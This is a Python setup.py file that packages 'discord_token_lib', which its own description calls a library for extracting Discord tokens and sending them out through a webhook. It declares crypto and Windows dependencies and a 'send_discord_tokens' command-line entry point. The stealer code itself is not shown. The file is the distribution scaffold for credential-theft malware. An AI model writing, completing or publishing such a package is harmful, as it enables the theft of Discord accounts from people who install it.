from setuptools import setup, find_packages

setup(
    name="discord_token_lib",
    version="0.1",
    packages=find_packages(),
    install_requires=[
        "requests",
        "pycryptodome",
        "pypiwin32",
    ],
    author="HeartWay",
    author_email="heartway_c.y@proton.me",
    description="Library for extracting and sending Discord tokens via webhook",
    long_description=open('README.md').read(),
    long_description_content_type="text/markdown",
    url="https://github.com/ton-compte/discord_token_lib",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
    entry_points={
        'console_scripts': [
            'send_discord_tokens=discord_token_lib.main:main',  # Corrige ici pour pointer vers discord_token_lib.main
        ],
    },
)
